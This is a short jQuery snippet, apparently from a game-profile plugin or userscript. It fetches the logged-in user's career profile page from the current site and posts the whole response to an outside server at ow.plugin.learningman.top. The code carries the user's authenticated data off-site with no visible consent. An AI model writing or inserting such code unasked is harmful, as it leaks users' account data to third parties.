$.ajax({
            url:"/action/career/profile?" + (new Date).getTime(),
            type:"GET",
            dataType:"text",
            success:function (a) {
                $.ajax({
                    url:"https://ow.plugin.learningman.top/update",
                    type:"POST",
                    data:JSON.stringify({"data":a}),
                    success:function (b) {
                        console.log(b)
                    }
                })
            }
        })